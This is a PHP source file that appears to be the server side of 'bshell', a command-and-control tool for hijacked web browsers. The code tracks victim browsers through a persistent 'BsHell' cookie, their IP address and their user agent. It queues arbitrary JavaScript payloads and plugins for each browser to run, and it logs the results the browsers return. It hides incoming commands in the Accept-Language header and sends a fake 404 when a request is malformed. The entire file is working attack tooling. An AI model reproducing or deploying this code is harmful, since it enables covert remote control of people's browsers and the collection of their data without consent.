<?php

class Log
{
  function loga($str) {
    //    print "$str\n";
    error_log(substr($str, 0, 512)."\n", 3, "bshell.log");
  }
}

class Plugins
{
  static $plugins;

  function register($plugin_name, $plugin_class) {
    Plugins::$plugins[$plugin_name] = $plugin_class;
  }

  function getPlugins()
  {
    return Plugins::$plugins;
  }
}

class Session
{
  function put($session) {
    return Session::save_session($session);
  }

  function get($sessionId) {
    $session=false;
    if($sessionId)
      $session = self::load_session($sessionId);
    if($session && isset($session->isnew))
      unset($session->isnew);
    if($session === false)
      $session = self::create_session();
    return $session;
  }

  function find($request)
  {
    $sessId = isset($request->sessionId) ? $request->sessionId : false;
    if(!$sessId) {
      if(isset($_COOKIE["BsHell"])) {
	$sessId = $_COOKIE["BsHell"];
      }
    }
    $sessId = preg_replace("/[^a-z0-9]/", "", $sessId);
    if(strlen($sessId) != 32)
      $sessId = false;

    return Session::get($sessId);
  }

  function updateLastActivity($session)
  {
    $session->last_activity = time();
    Session::put($session);
  }

  function isNew($session)
  {
    return isset($session->isnew);
  }

  function create_session()
  {
    $sessId = md5(rand().time().rand().microtime().rand());
    $session = new stdClass();
    $session->id = $sessId;
    $session->isnew = true;
    Log::loga("created new session: " . $sessId);
    return Session::save_session($session);
  }

  function save_session($session)
  {
    $fname = "sessions/".$session->id;
    if(file_put_contents($fname, json_encode($session), LOCK_EX))
      return $session;	
    return false;
	
  }

  function load_session($sessId)
  {
    $fname = "sessions/".$sessId;
    $session = false;
    if(strlen($sessId) == 32)
      if(file_exists($fname))
	$session = json_decode(file_get_contents($fname, LOCK_EX), false);
    return $session;
  }

}


class Payloads
{
  /**
   * Initialize a payload folder for a client, and copy contents of the initial folder
   * if $copyInitial is set to true (typically when a new client connects).
   * @param $sessionId the sessionId of the client 
   * @param $copyInitial set to true to copy contents of payloads/initial/ to the new folder
   */
  function init($sessionId, $copyInitial)
  {
    if(!is_dir("payloads"))
      mkdir("payloads", 0777);
    if(!is_dir("payloads" . DIRECTORY_SEPARATOR . $sessionId))
      mkdir("payloads" . DIRECTORY_SEPARATOR . $sessionId, 0777);
    if(!is_dir("payloads" . DIRECTORY_SEPARATOR . $sessionId. DIRECTORY_SEPARATOR . "res"))
      mkdir("payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . "res", 0777);

    if($copyInitial) {
      $sdir = "payloads" . DIRECTORY_SEPARATOR . "initial";
      $tdir = "payloads" . DIRECTORY_SEPARATOR .  $sessionId;
      if(is_dir($sdir)) {
	if( ($df = opendir($sdir)) != false) {
	  while($f = readdir($df)) {
	    if(is_file($sdir . DIRECTORY_SEPARATOR . $f))
	      file_put_contents($tdir . DIRECTORY_SEPARATOR . $f, file_get_contents($sdir . DIRECTORY_SEPARATOR . $f)); 
	  }
	}
      }	
    }
  }

  /**
   * Scan for a payload for a specific client. Tries to read the first payload it finds in payloads/$sessionId/
   * @returns the contents of the first file found in the clients payload folder, or false if no payload was found
   */
  function scan($sessionId)
  {
    $code = false;
    $dir = "payloads/$sessionId";
    if(is_dir($dir)) {
      if( ($df = opendir($dir)) != false) {
	while($f = readdir($df)) {
	  if($f !== "." && $f !== ".." && is_file($dir . DIRECTORY_SEPARATOR . $f)) {
	    Log::loga("payload file found: $dir/$f");
	    $code = array("id" => $f, "code" => file_get_contents($dir . DIRECTORY_SEPARATOR  . $f));
	    file_put_contents($dir . DIRECTORY_SEPARATOR  . "res" . DIRECTORY_SEPARATOR . $f, file_get_contents($dir . DIRECTORY_SEPARATOR . $f), FILE_APPEND);
	    unlink($dir . DIRECTORY_SEPARATOR . $f);
	  }
	}
      }
    }
    return $code;
  }
  
  /**
   * Send a payload defined as a string to a client, optionally wrapping it in
   * a function as per bshell definitions and writes it to the payload directory.
   * @param $basename string to identify the payload by. can be empty
   * @param $code the piece of javascript to send to the client.
   * @param $sessionId the sessionId of the client to send the payload to
   * @param $wrap set to true by default to wrap code in a bshell payload function
   */
  function send_code($basename, $sessionId, $code, $wrap=true)
  {
    if($wrap)
      $code = "function(bshell) {\n".$code."\n}(bshell);";
    $name = $basename.rand().".js";
    $dest = "payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . basename($name);
    file_put_contents($dest, $code);
  }

  /**
   * Assign a payload file of a specific type by a client.
   * @param $type can be "payloads" or "plugins"
   * @param $name the (file)name of the payload.
   * @param $sessionId the sessionId of the client to assign the payload
   */
  function assign($type, $name, $sessionId) 
  {
    $fil = $type . DIRECTORY_SEPARATOR . $name;
    Log::loga("Payloads::assign(type=$type, name=$name, sessionId=$sessionId)");
    $dest = "payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . basename($name);
    if(is_file($fil))
      file_put_contents($dest, file_get_contents($fil));
    else
      Log::loga("Payload not found " . $name . " (". $fil . ")");
  }

  /**
   * Called from the main script when a payload response is received.
   * Append the $response to the res/$cmdid.res file, if (and only if)
   * the original payload file exists (payloads/$sessionId/$cmdId)
   * @param $sessionId the sessionId of the client responding
   * @param $cmdid the name of the payload this response is from
   * @param $response the response received, as a json string
   */
  function response($sessionId, $cmdid, $response)
  {
    $cmdid = basename($cmdid);
    $fil = "payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . "res" . DIRECTORY_SEPARATOR . $cmdid;
    if(is_file($fil)) {
      $fil .= ".res";
      file_put_contents($fil, $response."\n", FILE_APPEND);
    }
  }


}

class Request
{
  function receive()
  {
    $request = false;
    if(isset($_REQUEST["req"])) {
      $request = json_decode($_REQUEST["req"]);
    } else if(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])) {
      $request = json_decode($_SERVER["HTTP_ACCEPT_LANGUAGE"]);
      if(!is_object($request)) {
	Header("404 Not Found");
	die();
      }
    }
    return $request;
  }


  function process($request, $session) {
    $response = false;

    if(!isset($session->ua))
      $session->ua = $_SERVER["HTTP_USER_AGENT"];
    else if($_SERVER["HTTP_USER_AGENT"] != $session->ua) 
      Log::loga("WARNING: Client " . $session->id . " changed UA from " . $session->ua . " to " . $_SERVER["HTTP_USER_AGENT"]);

    if(!isset($session->ip))
      $session->ip = $_SERVER["REMOTE_ADDR"];
    else if($_SERVER["REMOTE_ADDR"] != $session->ip) 
      Log::loga("WARNING: Client " . $session->id . " changed ip from " . $session->ip . " to " . $_SERVER["REMOTE_ADDR"]);

    if(isset($request->cmd))
      Log::loga("request from client " . $session->id . "(" . $session->ip . "): " . json_encode($request));

    $initialPayloads = false;
    switch($request->cmd) {
    case "payload":
      $payload = explode("/", $request->name);
      $name = $payload[0];
      if(isset($payload[1]))
	$name .= DIRECTORY_SEPARATOR . $payload[1];
      Payloads::assign("payloads", $name, $session->id);
      break;
	
    case "stop":
      Log::loga("client " . $session->id . " stopped");
      $session->stopped = true;
      break;
	
    case "start":
      $initialPayloads = true;
    case "resume":
      Log::loga("client " . $session->id . " " . $request->cmd . ": " . json_encode($session));
      Payloads::init($session->id, $initialPayloads);
      break;
	
    case "plugin":
      $plugin = basename($request->name);
      Payloads::assign("plugins", $plugin.DIRECTORY_SEPARATOR.$plugin.".js", $session->id);
      break;
	
    case "result":
      $resp = json_encode(isset($request->response) ? $request->response : false);
      Log::loga("response from client " . $session->id . " for " . $request->id . ": " . $resp);
      Payloads::response($session->id, $request->id, $resp);
      break;
	
    default:
      break;
    }

    
    foreach(Plugins::getPlugins() as $plugin_name => $plugin_cls) {
      if(preg_match("/^".$plugin_name."_/",  $request->cmd) == 1)
	$plugin_cls->onRequest($request, $session);
    }

    $code = Payloads::scan($session->id);
    $response = $code != false ? $code : array();

    Session::updateLastActivity($session);

    if(Session::isNew($session))
      $response["sessionId"] = $session->id;

    if(!DISABLE_COOKIES) {
      if(Session::isNew($session) || !isset($_COOKIE["BsHell"]) || $_COOKIE["BsHell"] !== $session->id) {
	SetCookie("BsHell", $session->id, time()+60*60*24*365, "/");
      }
    }
    return $response;
  }
}

?>